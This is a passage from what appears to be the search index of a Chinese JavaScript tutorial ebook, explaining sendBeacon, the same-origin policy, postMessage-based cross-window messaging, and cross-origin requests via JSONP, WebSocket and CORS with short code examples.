</ul>"},{"location":"ebook-JS-basic/10-1-BOM/#navigatorsendbeacon","title":"Navigator.sendBeacon()","text":"<p>\u5982\u679c\u5728\u754c\u9762\u5173\u95ed\u65f6\uff0c\u9700\u8981\u53d1\u9001\u8bf7\u6c42\uff0c\u90a3\u4e48\u8bf7\u6c42\u662f\u5f02\u6b65\u7684\uff0c\u53ef\u80fd\u754c\u9762\u5df2\u7ecf\u5378\u8f7d\u4e86\u624d\u53d1\u9001\u8bf7\u6c42\uff0c\u8fd9\u6837\u4f1a\u9020\u6210\u9519\u8bef\u3002\u4f20\u7edf\u7684\u89e3\u51b3\u601d\u8def\u662f\u8bbe\u7f6e\u4e00\u4e2a\u7761\u7720\u51fd\u6570\u6216\u8005\u6d88\u8017\u51fd\u6570\u62d6\u5ef6\u65f6\u95f4\uff0c\u4f46\u662f\u7528\u6237\u4f53\u9a8c\u548c\u6d4f\u89c8\u5668\u6027\u80fd\u4e0d\u597d\u3002</p> <pre><code>// a time-consuming operation, bad\nfor (let i = 1; i &lt; 10000; i++) {\n  for (let m = 1; m &lt; 10000; m++) {\n    continue;\n  }\n}\n</code></pre> <p>\u6240\u4ee5\u4f7f\u7528 Navigator.sendBeacon() \u65b9\u6cd5\uff1a\u8fd9\u4e2a\u65b9\u6cd5\u8fd8\u662f\u5f02\u6b65\u53d1\u51fa\u8bf7\u6c42\uff0c\u4f46\u662f\u8bf7\u6c42\u4e0e\u5f53\u524d\u9875\u9762\u7ebf\u7a0b\u8131\u94a9\uff0c\u4f5c\u4e3a\u6d4f\u89c8\u5668\u8fdb\u7a0b\u7684\u4efb\u52a1\uff0c\u56e0\u6b64\u53ef\u4ee5\u4fdd\u8bc1\u4f1a\u628a\u6570\u636e\u53d1\u51fa\u53bb\uff0c\u4e0d\u62d6\u5ef6\u5378\u8f7d\u6d41\u7a0b\u3002</p> <pre><code>// &lt;body onload=\"analytics('start')\" onunload=\"analytics('end')\"&gt;\nfunction analytics(state) {\n  if (!navigator.sendBeacon) {\n    return;\n  }\n  var data = 'state=' + state + '&amp;location=' + window.location;\n  navigator.sendBeacon('http://example.com/analytics', data);\n}\n</code></pre>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/","title":"10-2-\u540c\u6e90\u7b56\u7565","text":""},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#bom","title":"\u7b2c\u5341\u7ae0 BOM","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 29680  \u9605\u8bfb60\u5206\u949f</p> <p>2021-11-24 2023-04-11</p>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#107","title":"10.7 \u540c\u6e90\u7b56\u7565","text":""},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#same-origin","title":"Same-origin \u4ecb\u7ecd","text":"<p>\u8d77\u6e90\uff1a\u4e0d\u540c\u6e90\u7684\u7f51\u9875\u4e0d\u80fd\u6253\u5f00cookie\u3002</p> <p>\u540c\u6e90\uff1a\u534f\u8bae\u57df\u540d\u7aef\u53e3\u90fd\u76f8\u540c\u3002</p> <p>\u76ee\u7684\uff1a\u4fdd\u8bc1\u7528\u6237\u6570\u636e\u7684\u5b89\u5168\uff0c\u9632\u6b62\u6076\u610f\u7f51\u7ad9\u7a83\u53d6\u7528\u6237\u6570\u636e\u3002</p> <p>\u73b0\u5728\uff1a\u65e0\u6cd5\u83b7\u53d6\u975e\u540c\u6e90\u7f51\u9875\u7684cookie\uff0clocalStorage\uff0cIndexedDB\uff1bDOM\uff1b\u65e0\u6cd5\u53d1\u9001AJAX\u8bf7\u6c42\u3002</p> <p>\u975e\u540c\u6e90\u7f51\u9875\u53ef\u4ee5\u8c03\u7528\u4e0b\u9762\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002</p> <pre><code>window.closed\nwindow.frames\nwindow.length\nwindow.location\nwindow.opener\nwindow.parent\nwindow.self\nwindow.top\nwindow.window\nwindow.blur()\nwindow.close()\nwindow.focus()\nwindow.postMessage()\n</code></pre>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#cookie","title":"Cookie \u5171\u4eab","text":"<p>\u4e24\u4e2a\u7f51\u9875\u7684\u4e00\u7ea7\u57df\u540d\u76f8\u540c\uff08xxx.com\uff09\u6b21\u7ea7\u57df\u540d\u4e0d\u540c\uff08docs.demo\uff09\u53ef\u4ee5\u8bbe\u7f6e document.domain \u76f8\u540c\u6765\u5171\u4eabcookie\uff0c\u8bbe\u7f6e\u662f\u4f1a\u91cd\u7f6e\u7aef\u53e3\u4e3anull\u3002\u4e24\u4e2a\u9875\u9762\u9700\u8981\u540c\u65f6\u8bbe\u7f6e document.domain = 'xxx.com'; \u624d\u80fd\u8fbe\u5230\u540c\u6e90\u7684\u76ee\u7684\u3002\u8bbe\u7f6e\u540e\u4e24\u4e2a\u754c\u9762\u53ef\u4ee5\u901a\u8fc7 document.cookie \u83b7\u53d6\u76f8\u540c\u7684\u4fe1\u606f\u3002</p>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#iframe","title":"iframe\u591a\u7a97\u53e3\u901a\u4fe1","text":"<p>\u4e00\u4e2a\u754c\u9762\u4e2d\u5d4c\u5165\u591a\u4e2a\u7a97\u53e3\uff0c\u4e00\u4e2a\u7a97\u53e3\u53ef\u4ee5\u83b7\u53d6\u7236\u7a97\u53e3\u548c\u5b50\u7a97\u53e3\u7684window\uff0c\u5982\u679c\u4e0d\u540c\u6e90\uff0c\u4e0d\u80fd\u64cd\u4f5cDOM\uff08document.getElementByID('myIframe')..contentWindow.document \u4f1a\u62a5\u9519\uff09\u3002</p> <p>\u5982\u679c\u4e24\u4e2a\u7a97\u53e3\u7684\u4e00\u7ea7\u57df\u540d\u76f8\u540c\uff0c\u6b21\u7ea7\u57df\u540d\u4e0d\u540c\uff0c\u53ef\u4ee5\u7c7b\u4f3ccookie \u8bbe\u7f6e document.domain\u3002</p> <p>\u5982\u679cl\u4e24\u4e2a\u7a97\u53e3\u5b8c\u5168\u4e0d\u540c\u6e90\uff0c\u9700\u8981\u4f7f\u7528\u4e0b\u9762\u7684\u4e24\u4e2a\u65b9\u6848\uff08\u5f00\u53d1\u4e2d\u672a\u4f7f\u7528\uff09\uff1a</p> <p>\u7247\u6bb5\u8bc6\u522b\u7b26</p> <p>\u7247\u6bb5\u6807\u8bc6\u7b26\uff08fragment identifier\uff09\u6307\u7684\u662f\uff0cURL \u7684<code>#</code>\u53f7\u540e\u9762\u7684\u90e8\u5206\uff0c\u6bd4\u5982<code>http://example.com/x.html#fragment</code>\u7684<code>#fragment</code>\u3002\u5982\u679c\u53ea\u662f\u6539\u53d8\u7247\u6bb5\u6807\u8bc6\u7b26\uff0c\u9875\u9762\u4e0d\u4f1a\u91cd\u65b0\u5237\u65b0\u3002</p> <p>\u7236\u7a97\u53e3\u53ef\u4ee5\u628a\u4fe1\u606f\uff0c\u5199\u5165\u5b50\u7a97\u53e3\u7684\u7247\u6bb5\u6807\u8bc6\u7b26\u3002</p> <pre><code>var src = originURL + '#' + data;\ndocument.getElementById('myIFrame').src = src;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7236\u7a97\u53e3\u628a\u6240\u8981\u4f20\u9012\u7684\u4fe1\u606f\uff0c\u5199\u5165 iframe \u7a97\u53e3\u7684\u7247\u6bb5\u6807\u8bc6\u7b26\u3002</p> <p>\u5b50\u7a97\u53e3\u901a\u8fc7\u76d1\u542c<code>hashchange</code>\u4e8b\u4ef6\u5f97\u5230\u901a\u77e5\u3002</p> <pre><code>window.onhashchange = checkMessage;\n\nfunction checkMessage() {\n  var message = window.location.hash;\n  // ...\n}\n</code></pre> <p>\u540c\u6837\u7684\uff0c\u5b50\u7a97\u53e3\u4e5f\u53ef\u4ee5\u6539\u53d8\u7236\u7a97\u53e3\u7684\u7247\u6bb5\u6807\u8bc6\u7b26\u3002</p> <pre><code>parent.location.href = target + '#' + hash;\n</code></pre> <p>window.postMessage()</p> <p>\u4e0a\u9762\u7684\u8fd9\u79cd\u65b9\u6cd5\u5c5e\u4e8e\u7834\u89e3\uff0cHTML5 \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u5f15\u5165\u4e86\u4e00\u4e2a\u5168\u65b0\u7684API\uff1a\u8de8\u6587\u6863\u901a\u4fe1 API\uff08Cross-document messaging\uff09\u3002</p> <p>\u8fd9\u4e2a API \u4e3a<code>window</code>\u5bf9\u8c61\u65b0\u589e\u4e86\u4e00\u4e2a<code>window.postMessage</code>\u65b9\u6cd5\uff0c\u5141\u8bb8\u8de8\u7a97\u53e3\u901a\u4fe1\uff0c\u4e0d\u8bba\u8fd9\u4e24\u4e2a\u7a97\u53e3\u662f\u5426\u540c\u6e90\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u7236\u7a97\u53e3<code>aaa.com</code>\u5411\u5b50\u7a97\u53e3<code>bbb.com</code>\u53d1\u6d88\u606f\uff0c\u8c03\u7528<code>postMessage</code>\u65b9\u6cd5\u5c31\u53ef\u4ee5\u4e86\u3002</p> <pre><code>// \u7236\u7a97\u53e3\u6253\u5f00\u4e00\u4e2a\u5b50\u7a97\u53e3\nvar popup = window.open('http://bbb.com', 'title');\n// \u7236\u7a97\u53e3\u5411\u5b50\u7a97\u53e3\u53d1\u6d88\u606f\npopup.postMessage('Hello World!', 'http://bbb.com');\n</code></pre> <p><code>postMessage</code>\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5177\u4f53\u7684\u4fe1\u606f\u5185\u5bb9\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u63a5\u6536\u6d88\u606f\u7684\u7a97\u53e3\u7684\u6e90\uff08origin\uff09\uff0c\u5373\u201c\u534f\u8bae + \u57df\u540d + \u7aef\u53e3\u201d\u3002\u4e5f\u53ef\u4ee5\u8bbe\u4e3a<code>*</code>\uff0c\u8868\u793a\u4e0d\u9650\u5236\u57df\u540d\uff0c\u5411\u6240\u6709\u7a97\u53e3\u53d1\u9001\u3002</p> <p>\u5b50\u7a97\u53e3\u5411\u7236\u7a97\u53e3\u53d1\u9001\u6d88\u606f\u7684\u5199\u6cd5\u7c7b\u4f3c\u3002</p> <pre><code>// \u5b50\u7a97\u53e3\u5411\u7236\u7a97\u53e3\u53d1\u6d88\u606f\nwindow.opener.postMessage('Nice to see you', 'http://aaa.com');\n</code></pre> <p>\u7236\u7a97\u53e3\u548c\u5b50\u7a97\u53e3\u90fd\u53ef\u4ee5\u901a\u8fc7<code>message</code>\u4e8b\u4ef6\uff0c\u76d1\u542c\u5bf9\u65b9\u7684\u6d88\u606f\u3002</p> <pre><code>// \u7236\u7a97\u53e3\u548c\u5b50\u7a97\u53e3\u90fd\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u4ee3\u7801\uff0c\n// \u76d1\u542c message \u6d88\u606f\nwindow.addEventListener('message', function (e) {\n  console.log(e.data);\n},false);\n</code></pre> <p><code>message</code>\u4e8b\u4ef6\u7684\u53c2\u6570\u662f\u4e8b\u4ef6\u5bf9\u8c61<code>event</code>\uff0c\u63d0\u4f9b\u4ee5\u4e0b\u4e09\u4e2a\u5c5e\u6027\u3002</p> <ul> <li><code>event.source</code>\uff1a\u53d1\u9001\u6d88\u606f\u7684\u7a97\u53e3</li> <li><code>event.origin</code>: \u6d88\u606f\u53d1\u5411\u7684\u7f51\u5740</li> <li><code>event.data</code>: \u6d88\u606f\u5185\u5bb9</li> </ul> <p>\u4e0b\u9762\u7684\u4f8b\u5b50\u662f\uff0c\u5b50\u7a97\u53e3\u901a\u8fc7<code>event.source</code>\u5c5e\u6027\u5f15\u7528\u7236\u7a97\u53e3\uff0c\u7136\u540e\u53d1\u9001\u6d88\u606f\u3002</p> <pre><code>window.addEventListener('message', receiveMessage);\n\nfunction receiveMessage(event) {\n  event.source.postMessage('Nice to see you!', '*');\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u6709\u51e0\u4e2a\u5730\u65b9\u9700\u8981\u6ce8\u610f\u3002\u9996\u5148\uff0c<code>receiveMessage</code>\u51fd\u6570\u91cc\u9762\u6ca1\u6709\u8fc7\u6ee4\u4fe1\u606f\u7684\u6765\u6e90\uff0c\u4efb\u610f\u7f51\u5740\u53d1\u6765\u7684\u4fe1\u606f\u90fd\u4f1a\u88ab\u5904\u7406\u3002\u5176\u6b21\uff0c<code>postMessage</code>\u65b9\u6cd5\u4e2d\u6307\u5b9a\u7684\u76ee\u6807\u7a97\u53e3\u7684\u7f51\u5740\u662f\u4e00\u4e2a\u661f\u53f7\uff0c\u8868\u793a\u8be5\u4fe1\u606f\u53ef\u4ee5\u5411\u4efb\u610f\u7f51\u5740\u53d1\u9001\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u4e24\u79cd\u505a\u6cd5\u662f\u4e0d\u63a8\u8350\u7684\uff0c\u56e0\u4e3a\u4e0d\u591f\u5b89\u5168\uff0c\u53ef\u80fd\u4f1a\u88ab\u6076\u610f\u5229\u7528\u3002</p> <p><code>event.origin</code>\u5c5e\u6027\u53ef\u4ee5\u8fc7\u6ee4\u4e0d\u662f\u53d1\u7ed9\u672c\u7a97\u53e3\u7684\u6d88\u606f\u3002</p> <pre><code>window.addEventListener('message', receiveMessage);\nfunction receiveMessage(event) {\n  if (event.origin !== 'http://aaa.com') return;\n  if (event.data === 'Hello World') {\n    event.source.postMessage('Hello', event.origin);\n  } else {\n    console.log(event.data);\n  }\n}\n</code></pre> <p>LocalStorage</p> <p>\u901a\u8fc7<code>window.postMessage</code>\uff0c\u8bfb\u5199\u5176\u4ed6\u7a97\u53e3\u7684 LocalStorage \u4e5f\u6210\u4e3a\u4e86\u53ef\u80fd\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u4e3b\u7a97\u53e3\u5199\u5165 iframe \u5b50\u7a97\u53e3\u7684<code>localStorage</code>\u3002</p> <pre><code>window.onmessage = function(e) {\n  if (e.origin !== 'http://bbb.com') {\n    return;\n  }\n  var payload = JSON.parse(e.data);\n  localStorage.setItem(payload.key, JSON.stringify(payload.data));\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b50\u7a97\u53e3\u5c06\u7236\u7a97\u53e3\u53d1\u6765\u7684\u6d88\u606f\uff0c\u5199\u5165\u81ea\u5df1\u7684 LocalStorage\u3002</p> <p>\u7236\u7a97\u53e3\u53d1\u9001\u6d88\u606f\u7684\u4ee3\u7801\u5982\u4e0b\u3002</p> <pre><code>var win = document.getElementsByTagName('iframe')[0].contentWindow;\nvar obj = { name: 'Jack' };\nwin.postMessage(\n  JSON.stringify({key: 'storage', data: obj}),\n  'http://bbb.com'\n);\n</code></pre> <p>\u52a0\u5f3a\u7248\u7684\u5b50\u7a97\u53e3\u63a5\u6536\u6d88\u606f\u7684\u4ee3\u7801\u5982\u4e0b\u3002</p> <pre><code>window.onmessage = function(e) {\n  if (e.origin !== 'http://bbb.com') return;\n  var payload = JSON.parse(e.data);\n  switch (payload.method) {\n    case 'set':\n      localStorage.setItem(payload.key, JSON.stringify(payload.data));\n      break;\n    case 'get':\n      var parent = window.parent;\n      var data = localStorage.getItem(payload.key);\n      parent.postMessage(data, 'http://aaa.com');\n      break;\n    case 'remove':\n      localStorage.removeItem(payload.key);\n      break;\n  }\n};\n</code></pre> <p>\u52a0\u5f3a\u7248\u7684\u7236\u7a97\u53e3\u53d1\u9001\u6d88\u606f\u4ee3\u7801\u5982\u4e0b\u3002</p> <pre><code>var win = document.getElementsByTagName('iframe')[0].contentWindow;\nvar obj = { name: 'Jack' };\n// \u5b58\u5165\u5bf9\u8c61\nwin.postMessage(\n  JSON.stringify({key: 'storage', method: 'set', data: obj}),\n  'http://bbb.com'\n);\n// \u8bfb\u53d6\u5bf9\u8c61\nwin.postMessage(\n  JSON.stringify({key: 'storage', method: \"get\"}),\n  \"*\"\n);\nwindow.onmessage = function(e) {\n  if (e.origin != 'http://aaa.com') return;\n  console.log(JSON.parse(e.data).name);\n};\n</code></pre>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#ajax","title":"Ajax \u5904\u7406\u8de8\u57df","text":"<p>\u670d\u52a1\u5668\u7aef\u5904\u7406\uff1a\u67b6\u8bbe\u4ee3\u7406\u670d\u52a1\u5668\uff1a\u6d4f\u89c8\u5668\u8bbf\u95ee\u540c\u6e90\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u8bf7\u6c42\u5916\u90e8\u670d\u52a1\u3002\u8fd8\u6709\u4e09\u79cd\u65b9\u6cd5\uff1aJSONP\uff0cwebsocket\uff0c CORS\u3002</p>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#1jsonp","title":"1\u3001JSONP","text":"<p>JSONP \u7b80\u5355\u6613\u7528\uff0c\u6ca1\u6709\u517c\u5bb9\u6027\u95ee\u9898\uff0c\u8001\u5f0f\u6d4f\u89c8\u5668\u5168\u90e8\u652f\u6301\uff0c\u670d\u52a1\u7aef\u6539\u9020\u975e\u5e38\u5c0f\u3002</p> <p>\u5b83\u7684\u505a\u6cd5\u5982\u4e0b\u3002</p> <p>\u7b2c\u4e00\u6b65\uff0c\u7f51\u9875\u6dfb\u52a0\u4e00\u4e2a<code>&lt;script&gt;</code>\u5143\u7d20\uff0c\u5411\u670d\u52a1\u5668\u8bf7\u6c42\u4e00\u4e2a\u811a\u672c\uff0c\u8fd9\u4e0d\u53d7\u540c\u6e90\u653f\u7b56\u9650\u5236\uff0c\u53ef\u4ee5\u8de8\u57df\u8bf7\u6c42\u3002</p> <pre><code>&lt;script src=\"http://api.foo.com?callback=bar\"&gt;&lt;/script&gt;\n</code></pre> <p>\u6ce8\u610f\uff0c\u8bf7\u6c42\u7684\u811a\u672c\u7f51\u5740\u6709\u4e00\u4e2a<code>callback</code>\u53c2\u6570\uff08<code>?callback=bar</code>\uff09\uff0c\u7528\u6765\u544a\u8bc9\u670d\u52a1\u5668\uff0c\u5ba2\u6237\u7aef\u7684\u56de\u8c03\u51fd\u6570\u540d\u79f0\uff08<code>bar</code>\uff09\u3002</p> <p>\u7b2c\u4e8c\u6b65\uff0c\u670d\u52a1\u5668\u6536\u5230\u8bf7\u6c42\u540e\uff0c\u62fc\u63a5\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5c06 JSON \u6570\u636e\u653e\u5728\u51fd\u6570\u540d\u91cc\u9762\uff0c\u4f5c\u4e3a\u5b57\u7b26\u4e32\u8fd4\u56de\uff08<code>bar({...})</code>\uff09\u3002</p> <p>\u7b2c\u4e09\u6b65\uff0c\u5ba2\u6237\u7aef\u4f1a\u5c06\u670d\u52a1\u5668\u8fd4\u56de\u7684\u5b57\u7b26\u4e32\uff0c\u4f5c\u4e3a\u4ee3\u7801\u89e3\u6790\uff0c\u56e0\u4e3a\u6d4f\u89c8\u5668\u8ba4\u4e3a\uff0c\u8fd9\u662f<code>&lt;script&gt;</code>\u6807\u7b7e\u8bf7\u6c42\u7684\u811a\u672c\u5185\u5bb9\u3002\u8fd9\u65f6\uff0c\u5ba2\u6237\u7aef\u53ea\u8981\u5b9a\u4e49\u4e86<code>bar()</code>\u51fd\u6570\uff0c\u5c31\u80fd\u5728\u8be5\u51fd\u6570\u4f53\u5185\uff0c\u62ff\u5230\u670d\u52a1\u5668\u8fd4\u56de\u7684 JSON \u6570\u636e\u3002</p> <p>\u4e0b\u9762\u770b\u4e00\u4e2a\u5b9e\u4f8b\u3002\u9996\u5148\uff0c\u7f51\u9875\u52a8\u6001\u63d2\u5165<code>&lt;script&gt;</code>\u5143\u7d20\uff0c\u7531\u5b83\u5411\u8de8\u57df\u7f51\u5740\u53d1\u51fa\u8bf7\u6c42\u3002</p> <pre><code>function addScriptTag(src) {\n  var script = document.createElement('script');\n  script.setAttribute('type', 'text/javascript');\n  script.src = src;\n  document.body.appendChild(script);\n}\n\nwindow.onload = function () {\n  addScriptTag('http://example.com/ip?callback=foo');\n}\n\nfunction foo(data) {\n  console.log('Your public IP address is: ' + data.ip);\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u901a\u8fc7\u52a8\u6001\u6dfb\u52a0<code>&lt;script&gt;</code>\u5143\u7d20\uff0c\u5411\u670d\u52a1\u5668<code>example.com</code>\u53d1\u51fa\u8bf7\u6c42\u3002\u6ce8\u610f\uff0c\u8be5\u8bf7\u6c42\u7684\u67e5\u8be2\u5b57\u7b26\u4e32\u6709\u4e00\u4e2a<code>callback</code>\u53c2\u6570\uff0c\u7528\u6765\u6307\u5b9a\u56de\u8c03\u51fd\u6570\u7684\u540d\u5b57\uff0c\u8fd9\u5bf9\u4e8e JSONP \u662f\u5fc5\u9700\u7684\u3002</p> <p>\u670d\u52a1\u5668\u6536\u5230\u8fd9\u4e2a\u8bf7\u6c42\u4ee5\u540e\uff0c\u4f1a\u5c06\u6570\u636e\u653e\u5728\u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\u4f4d\u7f6e\u8fd4\u56de\u3002</p> <pre><code>foo({\n  'ip': '8.8.8.8'\n});\n</code></pre> <p>\u7531\u4e8e<code>&lt;script&gt;</code>\u5143\u7d20\u8bf7\u6c42\u7684\u811a\u672c\uff0c\u76f4\u63a5\u4f5c\u4e3a\u4ee3\u7801\u8fd0\u884c\u3002\u8fd9\u65f6\uff0c\u53ea\u8981\u6d4f\u89c8\u5668\u5b9a\u4e49\u4e86<code>foo</code>\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u5c31\u4f1a\u7acb\u5373\u8c03\u7528\u3002\u4f5c\u4e3a\u53c2\u6570\u7684 JSON \u6570\u636e\u88ab\u89c6\u4e3a JavaScript \u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u56e0\u6b64\u907f\u514d\u4e86\u4f7f\u7528<code>JSON.parse</code>\u7684\u6b65\u9aa4\u3002</p>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#2websocket","title":"2\u3001WebSocket","text":"<p>WebSocket \u662f\u4e00\u79cd\u901a\u4fe1\u534f\u8bae\uff0c\u4f7f\u7528<code>ws://</code>\uff08\u975e\u52a0\u5bc6\uff09\u548c<code>wss://</code>\uff08\u52a0\u5bc6\uff09\u4f5c\u4e3a\u534f\u8bae\u524d\u7f00\u3002\u8be5\u534f\u8bae\u4e0d\u5b9e\u884c\u540c\u6e90\u653f\u7b56\uff0c\u53ea\u8981\u670d\u52a1\u5668\u652f\u6301\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u5b83\u8fdb\u884c\u8de8\u6e90\u901a\u4fe1\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6d4f\u89c8\u5668\u53d1\u51fa\u7684 WebSocket \u8bf7\u6c42\u7684\u5934\u4fe1\u606f\u3002</p> <pre><code>GET /chat HTTP/1.1\nHost: server.example.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Protocol: chat, superchat\nSec-WebSocket-Version: 13\n\nOrigin: http://example.com\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6709\u4e00\u4e2a\u5b57\u6bb5\u662f<code>Origin</code>\uff0c\u8868\u793a\u8be5\u8bf7\u6c42\u7684\u8bf7\u6c42\u6e90\uff08origin\uff09\uff0c\u5373\u53d1\u81ea\u54ea\u4e2a\u57df\u540d\u3002</p> <p>\u6b63\u662f\u56e0\u4e3a\u6709\u4e86<code>Origin</code>\u8fd9\u4e2a\u5b57\u6bb5\uff0c\u6240\u4ee5 WebSocket \u624d\u6ca1\u6709\u5b9e\u884c\u540c\u6e90\u653f\u7b56\u3002\u56e0\u4e3a\u670d\u52a1\u5668\u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u5b57\u6bb5\uff0c\u5224\u65ad\u662f\u5426\u8bb8\u53ef\u672c\u6b21\u901a\u4fe1\u3002\u5982\u679c\u8be5\u57df\u540d\u5728\u767d\u540d\u5355\u5185\uff0c\u670d\u52a1\u5668\u5c31\u4f1a\u505a\u51fa\u5982\u4e0b\u56de\u5e94\u3002</p> <pre><code>HTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=\nSec-WebSocket-Protocol: chat\n</code></pre>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#3cors","title":"3\u3001CORS","text":""},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#108-cors","title":"10.8 CORS","text":""},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#cors","title":"CORS\u6982\u8ff0","text":"<p>CORS \u662f\u8de8\u6e90\u8d44\u6e90\u5206\u4eab\uff08Cross-Origin Resource Sharing\uff09\u7684\u7f29\u5199\uff0c\u5b83\u662f W3C \u6807\u51c6\uff0c\u5c5e\u4e8e\u8de8\u6e90 AJAX \u8bf7\u6c42\u7684\u6839\u672c\u89e3\u51b3\u65b9\u6cd5\u3002\u76f8\u6bd4 JSONP \u53ea\u80fd\u53d1<code>GET</code>\u8bf7\u6c42\uff0cCORS \u5141\u8bb8\u4efb\u4f55\u7c7b\u578b\u7684\u8bf7\u6c42\u3002JSONP \u7684\u4f18\u52bf\u5728\u4e8e\u652f\u6301\u8001\u5f0f\u6d4f\u89c8\u5668\uff0c\u4ee5\u53ca\u53ef\u4ee5\u5411\u4e0d\u652f\u6301 CORS \u7684\u7f51\u7ad9\u8bf7\u6c42\u6570\u636e\u3002</p> <p>\u517c\u5bb9\uff1aCORS \u9700\u8981\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u540c\u65f6\u652f\u6301\uff0c\u76ee\u524d\u6d4f\u89c8\u5668\u90fd\u652f\u6301\u3002\u5bf9\u4e8e\u524d\u7aef\u5f00\u53d1\uff0cCORS\u548cAJAX\u5dee\u4e0d\u591a\uff0c\u5982\u679c\u53d1\u51fa\u7684\u8bf7\u6c42\u662f\u8de8\u57df\u7684\uff0c\u90a3\u4e48\u5728\u8bf7\u6c42\u5934\u66f4\u6539\u4fe1\u606f\uff0c\u7528\u6237\u4f53\u9a8c\u826f\u597d\u3002\u540e\u7aef\u5f00\u53d1\u9700\u8981\u5728\u670d\u52a1\u5668\u5b9e\u73b0CORS API\u3002</p> <p>\u5206\u7c7b\uff1a\u7b80\u5355\u8bf7\u6c42\u548c\u975e\u7b80\u5355\u8bf7\u6c42</p> <p>\u7b80\u5355\u8bf7\u6c42\uff1a\u8bf7\u6c42\u65b9\u6cd5\uff08get-post-head\uff09\u548c\u8bf7\u6c42\u5934\u4fe1\u606f\u7b80\u5355\uff0c\u8bf7\u6c42\u5934\u53ea\u80fd\u662f\u4e0b\u9762\u7684\u5c5e\u6027\u3002\u7b80\u5355\u8bf7\u6c42\u7c7b\u4f3c\u4e8e\u8868\u5355\u8bf7\u6c42\uff0c\u6d4f\u89c8\u5668\u5141\u8bb8\u8868\u5355\u8bf7\u6c42\u8de8\u57df\u3002</p> <pre><code>Accept\nAccept-Language\nContent-Language\nLast-Event-ID\nContent-Type\uff1a\u53ea\u9650\u4e8e\u4e09\u4e2a\u503capplication/x-www-form-urlencoded\u3001multipart/form-data\u3001text/plain\n</code></pre>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#_1","title":"\u7b80\u5355\u8bf7\u6c42","text":"<p>\u6d4f\u89c8\u5668\u53d1\u73b0\u8bf7\u6c42\u8de8\u57df\uff0c\u9700\u8981\u5728\u8bf7\u6c42\u5934\u4e2d\u52a0\u5165 Origin: https://demo.xxx.com \u5b57\u6bb5\uff0c\u5305\u62ec\u5f53\u524d\u8bf7\u6c42\u7684\u534f\u8bae\u57df\u540d\u7aef\u53e3\u53f7\uff1b\u670d\u52a1\u5668\u5224\u65ad\u8fd9\u4e2aorigin\u5728\u8bb8\u53ef\u7684\u8303\u56f4\u5185\uff0c\u5728\u76f8\u5e94\u5934\u4e2d\u6dfb\u52a0 Access-Control-Allow-Origin \u5b57\u6bb5\uff0c\u5b9e\u73b0\u8de8\u57df\uff1b\u5982\u679c\u8fd9\u4e2aorigin\u4e0d\u5728\u8bb8\u53ef\u8303\u56f4\u5185\uff0c\u5c31\u8fd4\u56de\u6b63\u5e38\u7684HTTP\u56de\u5e94\uff0c\u4e0d\u5305\u542b Access-Control-Allow-Origin \u5b57\u6bb5\uff0c\u6b64\u65f6\u524d\u7aefxhr.onerror \u4f1a\u6355\u83b7\u5230\u8fd9\u4e2a\u9519\u8bef\u3002\u4e0b\u9762\u662f\u6b63\u786e\u7684\u5b57\u7b26\u8bf4\u660e</p> <pre><code>// \u670d\u52a1\u5668\u7684\u54cd\u5e94\u5934\nAccess-Control-Allow-Origin: http://api.bob.com // 